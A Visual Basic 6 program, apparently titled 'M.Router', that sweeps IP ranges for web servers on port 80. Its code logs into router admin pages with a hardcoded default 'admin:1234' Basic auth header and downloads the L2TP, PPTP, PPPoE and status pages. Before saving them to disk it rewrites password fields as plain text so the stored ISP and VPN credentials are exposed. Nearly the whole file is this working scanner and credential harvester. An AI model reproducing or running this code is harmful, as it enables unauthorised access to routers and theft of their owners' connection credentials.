VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00808080&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "M.Router"
   ClientHeight    =   7845
   ClientLeft      =   45
   ClientTop       =   435
   ClientWidth     =   9915
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   7845
   ScaleWidth      =   9915
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command2 
      Caption         =   "Stop"
      Enabled         =   0   'False
      Height          =   375
      Left            =   9120
      TabIndex        =   29
      Top             =   3240
      Width           =   735
   End
   Begin VB.TextBox txtSegment1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   3675
      MaxLength       =   3
      TabIndex        =   28
      Text            =   "172"
      Top             =   3405
      Width           =   495
   End
   Begin VB.TextBox txtSegment4 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   5115
      MaxLength       =   3
      TabIndex        =   27
      Text            =   "1"
      Top             =   3405
      Width           =   495
   End
   Begin VB.TextBox txtSegment3 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   4635
      MaxLength       =   3
      TabIndex        =   26
      Text            =   "1"
      Top             =   3405
      Width           =   495
   End
   Begin VB.TextBox txtSegment2 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   4155
      MaxLength       =   3
      TabIndex        =   25
      Text            =   "21"
      Top             =   3405
      Width           =   495
   End
   Begin VB.TextBox txtLastIP2tp 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   255
      Left            =   6240
      TabIndex        =   24
      Text            =   "last IP"
      Top             =   3720
      Width           =   1695
   End
   Begin VB.TextBox Textstatus 
      BackColor       =   &H00000000&
      ForeColor       =   &H00808080&
      Height          =   1575
      Left            =   5160
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   23
      Text            =   "Form1.frx":0000
      Top             =   4560
      Visible         =   0   'False
      Width           =   1695
   End
   Begin MSWinsockLib.Winsock Winsock5 
      Left            =   16800
      Top             =   2760
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   80
   End
   Begin VB.ListBox List5 
      Appearance      =   0  'Flat
      BackColor       =   &H8000000C&
      ForeColor       =   &H0000FF00&
      Height          =   2565
      Left            =   7920
      TabIndex        =   22
      Top             =   0
      Width           =   1935
   End
   Begin VB.Timer Timer3 
      Interval        =   1000
      Left            =   2760
      Top             =   3960
   End
   Begin VB.CommandButton Command1 
      Caption         =   "x"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   12
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   450
      Left            =   9360
      TabIndex        =   14
      Top             =   4560
      Width           =   465
   End
   Begin VB.ListBox List4 
      Appearance      =   0  'Flat
      BackColor       =   &H8000000C&
      ForeColor       =   &H0000FF00&
      Height          =   2565
      Left            =   6000
      TabIndex        =   11
      Top             =   0
      Width           =   1935
   End
   Begin VB.ListBox List3 
      Appearance      =   0  'Flat
      BackColor       =   &H8000000C&
      ForeColor       =   &H0000FF00&
      Height          =   2565
      Left            =   4200
      TabIndex        =   10
      Top             =   0
      Width           =   1815
   End
   Begin MSWinsockLib.Winsock Winsock4 
      Left            =   3240
      Top             =   4560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   80
   End
   Begin MSWinsockLib.Winsock Winsock3 
      Left            =   2760
      Top             =   4560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   80
   End
   Begin VB.TextBox Text6 
      BackColor       =   &H00000000&
      ForeColor       =   &H00808080&
      Height          =   1575
      Left            =   5760
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   9
      Text            =   "Form1.frx":0006
      Top             =   4560
      Visible         =   0   'False
      Width           =   1815
   End
   Begin VB.TextBox Text5 
      BackColor       =   &H00000000&
      ForeColor       =   &H00808080&
      Height          =   2775
      Left            =   2280
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   8
      Text            =   "Form1.frx":000D
      Top             =   5040
      Width           =   7575
   End
   Begin VB.Timer Timer2 
      Interval        =   1
      Left            =   3240
      Top             =   3960
   End
   Begin VB.ListBox List2 
      Appearance      =   0  'Flat
      BackColor       =   &H8000000C&
      ForeColor       =   &H0000FF00&
      Height          =   2565
      Left            =   2280
      TabIndex        =   7
      Top             =   0
      Width           =   1935
   End
   Begin VB.TextBox Text4 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   36
         Charset         =   204
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   840
      Left            =   2280
      TabIndex        =   5
      Text            =   "255.255.255.255"
      Top             =   2520
      Width           =   5655
   End
   Begin VB.ListBox List1 
      BackColor       =   &H80000008&
      ForeColor       =   &H0000FFFF&
      Height          =   7860
      Left            =   0
      TabIndex        =   3
      Top             =   0
      Width           =   2295
   End
   Begin VB.CommandButton Command3 
      Caption         =   "Start"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   24
         Charset         =   204
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   615
      Left            =   2280
      TabIndex        =   2
      Top             =   3360
      Width           =   1335
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   3720
      Top             =   4560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      RemotePort      =   80
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H00000000&
      ForeColor       =   &H00808080&
      Height          =   1575
      Left            =   4560
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   1
      Text            =   "Form1.frx":0015
      Top             =   4440
      Visible         =   0   'False
      Width           =   1815
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      Height          =   285
      Left            =   8040
      TabIndex        =   0
      Text            =   "Download Status"
      Top             =   3690
      Width           =   1335
   End
   Begin VB.Timer Timer1 
      Interval        =   200
      Left            =   2280
      Top             =   3960
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   2280
      Top             =   4560
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label8 
      BackStyle       =   0  'Transparent
      Caption         =   "Download interval:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   3675
      TabIndex        =   21
      Top             =   4005
      Width           =   1695
   End
   Begin VB.Label Label7 
      BackStyle       =   0  'Transparent
      Caption         =   "Ping Speed:"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   3675
      TabIndex        =   20
      Top             =   3765
      Width           =   1575
   End
   Begin VB.Label Labelw4 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H0000FF00&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "PPTP"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   204
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   9180
      TabIndex        =   19
      Top             =   2580
      Width           =   615
   End
   Begin VB.Label Labelw1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H0000FF00&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "2TP"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   204
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   7980
      TabIndex        =   18
      Top             =   2580
      Width           =   615
   End
   Begin VB.Label Labelw3 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H0000FF00&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "PPoE"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   204
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   8580
      TabIndex        =   17
      Top             =   2580
      Width           =   615
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "p/s"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   5355
      TabIndex        =   16
      Top             =   3765
      Width           =   735
   End
   Begin VB.Label Label5 
      Appearance      =   0  'Flat
      BackColor       =   &H00FFFF80&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Sock"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   7980
      TabIndex        =   15
      Top             =   2865
      Width           =   1815
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Counted to download"
      Height          =   255
      Left            =   5760
      TabIndex        =   13
      Top             =   3480
      Width           =   1935
   End
   Begin VB.Label Label3 
      BackStyle       =   0  'Transparent
      Caption         =   "Interval"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   204
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   5355
      TabIndex        =   12
      Top             =   4005
      Width           =   975
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Lentgh"
      Height          =   255
      Left            =   8040
      TabIndex        =   6
      Top             =   3240
      Width           =   1215
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "Status"
      Height          =   255
      Left            =   2280
      TabIndex        =   4
      Top             =   4440
      Width           =   1335
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public Counter_W1 As Integer
Public Counter_W2 As Integer
Public Counter_W3 As Integer

Public Counter_W4 As Integer

Public Scan_Flaf As Boolean

Private Sub Command1_Click()
End


End Sub

Private Function Start(ip As String)
On Error Resume Next
Winsock1.Close

Winsock1.Connect ip, 80
End Function
Private Function Start2(ip As String)
On Error Resume Next
Winsock3.Close

Winsock3.Connect ip, 80
End Function
Private Function Start3(ip As String)
On Error Resume Next
Winsock4.Close

Winsock4.Connect ip, 80
End Function
Private Function StartStatus(ip As String)
On Error Resume Next
Winsock5.Close

Winsock5.Connect ip, 80
End Function
Public Sub Down()
On Error Resume Next
Text2.Text = ""
txtLastIP2tp.Text = Winsock1.RemoteHostIP
'http://172.22.6.19/wanl2tp.asp
'http://172.22.6.19/wanpptp.asp
'http://172.22.6.19/wanpppoe.asp

'http://172.22.1.210/wanpppoe.asp
'http://172.22.1.210/wanpptp.asp
lol = "GET /wanl2tp.asp HTTP/1.0" & vbCrLf + _
"Accept: */*" & vbCrLf + _
"Referer: http://" + Winsock1.RemoteHostIP + "/genmenu.asp" & vbCrLf + _
"Accept -Language: ru" & vbCrLf + _
"UA -CPU: x86" & vbCrLf + _
"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" & vbCrLf + _
"Proxy -Connection: Keep -Alive" & vbCrLf + _
"Host: " + Winsock1.RemoteHostIP & vbCrLf + _
"Pragma: no -cache" & vbCrLf + _
"Authorization: Basic YWRtaW46MTIzNA==" & vbCrLf & vbCrLf

Winsock1.SendData (lol)
End Sub
Public Sub Down_Status()
On Error Resume Next
Textstatus.Text = ""

lol = "GET /stadevice.asp HTTP/1.0" & vbCrLf + _
"Accept: */*" & vbCrLf + _
"Referer: http://" + Winsock5.RemoteHostIP + "/genmenu.asp" & vbCrLf + _
"Accept -Language: ru" & vbCrLf + _
"UA -CPU: x86" & vbCrLf + _
"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" & vbCrLf + _
"Proxy -Connection: Keep -Alive" & vbCrLf + _
"Host: " + Winsock5.RemoteHostIP & vbCrLf + _
"Pragma: no -cache" & vbCrLf + _
"Authorization: Basic YWRtaW46MTIzNA==" & vbCrLf & vbCrLf

Winsock5.SendData (lol)
End Sub
Public Sub Down_ppoe()
On Error Resume Next
Text5.Text = ""
'http://172.22.1.210/wanpppoe.asp
'http://172.22.1.210/wanpptp.asp
lol = "GET /wanpppoe.asp HTTP/1.0" & vbCrLf + _
"Accept: */*" & vbCrLf + _
"Referer: http://" + Winsock3.RemoteHostIP + "/genmenu.asp" & vbCrLf + _
"Accept -Language: ru" & vbCrLf + _
"UA -CPU: x86" & vbCrLf + _
"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" & vbCrLf + _
"Proxy -Connection: Keep -Alive" & vbCrLf + _
"Host: " + Winsock3.RemoteHostIP & vbCrLf + _
"Pragma: no -cache" & vbCrLf + _
"Authorization: Basic YWRtaW46MTIzNA==" & vbCrLf & vbCrLf

Winsock3.SendData (lol)
End Sub

Public Sub Down_pptp()
On Error Resume Next
Text6.Text = ""
'http://172.22.1.210/wanpppoe.asp
'http://172.22.1.210/wanpptp.asp
lol = "GET /wanpptp.asp HTTP/1.0" & vbCrLf + _
"Accept: */*" & vbCrLf + _
"Referer: http://" + Winsock4.RemoteHostIP + "/genmenu.asp" & vbCrLf + _
"Accept -Language: ru" & vbCrLf + _
"UA -CPU: x86" & vbCrLf + _
"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" & vbCrLf + _
"Proxy -Connection: Keep -Alive" & vbCrLf + _
"Host: " + Winsock4.RemoteHostIP & vbCrLf + _
"Pragma: no -cache" & vbCrLf + _
"Authorization: Basic YWRtaW46MTIzNA==" & vbCrLf & vbCrLf

Winsock4.SendData (lol)
End Sub




Private Sub Command2_Click()
Command2.Enabled = False
Scan_Flaf = False
Save_Parsed_list
End Sub

Private Sub Command3_Click()
On Error Resume Next
Command2.Enabled = True
Dim i As Long
Dim ip As String
DoEvents

Dim data As String
Dim o As Long
Dim flag As Boolean
Dim segment As Long
Dim segment1 As Long
Dim segment2 As Long
Dim Time_out As Long

Dim Not_founded As Long

Dim prev_flag  As Boolean

segment1 = Int(txtSegment1.Text)
segment2 = Int(txtSegment2.Text)


segment = Int(txtSegment3.Text)

Time_out = 12000
Scan_Flaf = True
For i = 1 To 255
    If Not Scan_Flaf Then
        Exit For
    End If
    
    ip = segment1 & "." & segment2 & "." & segment & "." & i
  
    Winsock2.Close

    Winsock2.Connect ip, 80

    prev_flag = flag
    
    
    
    If Time_out < 3150 Then
        Time_out = 5250
    End If
    
    Label6.Caption = Time_out
    
    flag = True
    Text4.Text = ip
    Label1.Caption = Str(Winsock2.State)
    o = 0
    While Winsock2.State <> 7 And flag
    DoEvents
        o = o + 1
         Label1.Caption = Str(Winsock2.State)
        If Winsock2.State = 6 And o = Time_out Then
            If Not prev_flag Then
                Time_out = Time_out - Int(Time_out / 100)
            Else
                Time_out = 14000
            End If
            flag = False
        ElseIf Winsock2.State = 9 Then
            flag = False
        End If

    Wend
    
    If Winsock2.State = 7 Then
        List1.AddItem ip
        For t = 0 To List2.ListCount
            If Len(List2.List(t)) < 3 Then
                List2.List(t) = ip
                Exit For
            End If
        Next
        For t = 0 To List3.ListCount
            If Len(List3.List(t)) < 3 Then
                List3.List(t) = ip
                Exit For
            End If
        Next
        For t = 0 To List4.ListCount
            If Len(List4.List(t)) < 3 Then
                List4.List(t) = ip
                Exit For
            End If
        Next
        For t = 0 To List5.ListCount
            If Len(List5.List(t)) < 3 Then
                List5.List(t) = ip
                Exit For
            End If
        Next
        'List2.AddItem ip
        'Start (ip)
    End If
    
    If i = 255 Then
        segment = segment + 1
        i = 1
    End If
    If segment = 255 Then
        segment2 = segment2 + 1
        segment = 1
    End If
Next
End Sub

Private Sub Form_Unload(Cancel As Integer)
End
End Sub

Private Sub Timer1_Timer()
    Text1.Text = Winsock1.State

Labelw1.Caption = "2TP: " & Counter_W1
Labelw3.Caption = "PPoE: " & Counter_W2
Labelw4.Caption = "PPTP: " & Counter_W3
End Sub


Private Sub Timer2_Timer()
On Error Resume Next

Label5.Caption = "1:" + Str(Winsock1.State) + " / 2:" + Str(Winsock3.State) + " /3:" + Str(Winsock4.State)

Dim List_counter As Integer
For er = 0 To List4.ListCount
    If Len(List4.List(er)) > 2 Then
        List_counter = List_counter + 1
    End If
    
Next

Label4.Caption = List_counter

If List_counter < 3 Then
    Timer2.Interval = Timer2.Interval + Int(500 / (List_counter + 1))
ElseIf List_counter > 3 Then
    Timer2.Interval = Timer2.Interval - (80 * (List_counter + 1))
End If
If List_counter > 13 Or Timer2.Interval < 900 Then
    Timer2.Interval = 900
End If

Label3.Caption = Timer2.Interval
If Winsock1.State = 0 Or Winsock1.State = 8 Or Winsock1.State = 9 Then
    For i = 0 To List2.ListCount
        If Len(List2.List(List2.ListCount - i)) > 2 Then
            Start (List2.List(List2.ListCount - i))
            'List2.List(List2.ListCount - i) = ""
            List2.RemoveItem (List2.ListCount - i)
            
            Exit For
        End If
        
    Next
End If
If Winsock3.State = 0 Or Winsock3.State = 8 Or Winsock3.State = 9 Then
    For i = 0 To List3.ListCount
        If Len(List3.List(List3.ListCount - i)) > 2 Then
            Start2 (List3.List(List3.ListCount - i))
            List3.RemoveItem (List3.ListCount - i)
            Exit For
        End If
        
    Next
End If
If Winsock4.State = 0 Or Winsock4.State = 8 Or Winsock4.State = 9 Then
    For i = 0 To List4.ListCount
        If Len(List4.List(List4.ListCount - i)) > 2 Then
            Start3 (List4.List(List4.ListCount - i))
            List4.RemoveItem (List4.ListCount - i)
            Exit For
        End If
        
    Next
End If
If Winsock5.State = 0 Or Winsock5.State = 8 Or Winsock5.State = 9 Then
    For i = 0 To List5.ListCount
        If Len(List5.List(List5.ListCount - i)) > 2 Then
            StartStatus (List5.List(List5.ListCount - i))
            List5.RemoveItem (List5.ListCount - i)
            Exit For
        End If
        
    Next
End If

If Timer2.Interval = 36000 Then
    Timer2.Interval = 2200
End If
End Sub

Private Sub Timer3_Timer()
If Winsock1.State = 7 Then
    Counter_W1 = Counter_W1 + 1
End If
If Winsock3.State = 7 Then
    Counter_W2 = Counter_W2 + 1
End If
If Winsock4.State = 7 Then
    Counter_W3 = Counter_W3 + 1
End If

If Winsock5.State = 7 Then
    Counter_W4 = Counter_W4 + 1
End If

If Counter_W1 = 3 Then
    Winsock1.Close
    Counter_W1 = 0
End If
If Counter_W2 = 3 Then
    Winsock3.Close
    Counter_W2 = 0
End If
If Counter_W3 = 3 Then
    Winsock4.Close
    Counter_W3 = 0
End If
If Counter_W4 = 3 Then
    Winsock5.Close
    Counter_W4 = 0
End If
End Sub

Private Sub Winsock1_Close()
    GO_Save
    Counter_W1 = 0
    Labelw1.BackColor = &HFF00&

End Sub

Private Sub Winsock1_Connect()
    Down
    'i = Check("^1?\s*-?\s*(\d{3}|\(\s*\d{3}\s*\))\s*-?\s*\d{3}\s*-?\s*\d{4}$", Text2.Text)

    Labelw1.BackColor = &HFF&
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim data As String

On Error Resume Next
Winsock1.GetData data
Text2.Text = Text2.Text & data & vbCrLf

    
End Sub


Public Sub Wr_To_file(txt As String, f_name As String, type_of_page As String)
On Error Resume Next
       'declare and initiate required objects
    Dim fs As FileSystemObject
    Dim ts As TextStream
     
    Set fs = New FileSystemObject

       'To write
    Set ts = fs.OpenTextFile("c:\Fucker\" + f_name + "_" + type_of_page + ".html", ForWriting, True)
    txt = Replace(txt, "type=""password""", "type=""text""")
    txt = Mid(txt, InStr(1, txt, "<html>"))
    ts.Write (txt)
    ts.Close
     


       'clear memory used by FSO objects
    Set ts = Nothing
    Set fs = Nothing
End Sub

Private Sub GO_Save()
Label2.Caption = Len(Text2.Text)
Dim Len_of_Data As Long
Dim val As String

Len_of_Data = Len(Text2.Text)
If Len_of_Data > 1000 Then
    val = " (Sav):" & Len_of_Data
    Wr_To_file Text2.Text, Winsock1.RemoteHostIP, "L2TP"
ElseIf Len_of_Data = 120 Then
    val = " -cisco:" & Len_of_Data
    Wr_To_file Text2.Text, "cisco\" + Winsock1.RemoteHostIP, "L2TP_" + Str(Len_of_Data)
ElseIf Len_of_Data > 30 Then
    val = " (Not S):" & Len_of_Data
    Wr_To_file Text2.Text, "errors\" + Winsock1.RemoteHostIP, "L2TP_" + Str(Len_of_Data)
Else
    val = " (Bad !):" & Len_of_Data
    Wr_To_file Text2.Text, "bad\" + Winsock1.RemoteHostIP, "L2TP_" + Str(Len_of_Data)
End If

    For i = 0 To List1.ListCount
        If List1.List(List1.ListCount - i) = Winsock1.RemoteHost Then
            List1.List(List1.ListCount - i) = List1.List(List1.ListCount - i) & val
            Exit For
        End If
    Next
End Sub
Private Sub GO_Save_p1()
Label2.Caption = Len(Text5.Text)
If Len(Text5.Text) > 1000 Then

    Wr_To_file Text5.Text, Winsock3.RemoteHostIP, "PPPoE"
End If
End Sub
Private Sub GO_Save_p2()
Label2.Caption = Len(Text6.Text)
If Len(Text6.Text) > 1000 Then

    Wr_To_file Text6.Text, Winsock4.RemoteHostIP, "PPTP"
End If
End Sub
Private Sub GO_Save_Status()

If Len(Textstatus.Text) > 1000 Then

    Wr_To_file Textstatus.Text, Winsock5.RemoteHostIP, "Status"
End If
End Sub

Private Sub Winsock3_Close()
    GO_Save_p1
    Counter_W2 = 0
    Labelw3.BackColor = &HFF00&
    
End Sub
Private Sub Winsock4_Close()
    GO_Save_p2
    Counter_W3 = 0
        Labelw4.BackColor = &HFF00&

End Sub

Private Sub Winsock3_Connect()
Labelw3.BackColor = &HFF&
Down_ppoe
End Sub

Private Sub Winsock4_Connect()
Down_pptp

Labelw4.BackColor = &HFF&
End Sub

Private Sub Winsock3_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim data As String

Winsock3.GetData data
Text5.Text = Text5.Text & data & vbCrLf

End Sub


Private Sub Winsock4_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim data As String

Winsock4.GetData data
Text6.Text = Text6.Text & data & vbCrLf

End Sub

Private Sub Winsock5_Close()
    GO_Save_Status
    Counter_W4 = 0
End Sub

Private Sub Winsock5_Connect()
Down_Status

End Sub

Private Sub Winsock5_DataArrival(ByVal bytesTotal As Long)
Dim data As String

On Error Resume Next
Winsock5.GetData data
Textstatus.Text = Textstatus.Text & data & vbCrLf
End Sub


Public Function Save_Parsed_list()
Dim data_to_save As String
    For i = 0 To List1.ListCount
        data_to_save = data_to_save & List1.List(i) & vbNewLine
    Next
On Error Resume Next

    Dim fs As FileSystemObject
    Dim ts As TextStream
     
    Set fs = New FileSystemObject


    Set ts = fs.OpenTextFile("list_ip.log", ForAppending, True)
   

    ts.Write (data_to_save)
    ts.Close
     


    Set ts = Nothing
    Set fs = Nothing
End Function
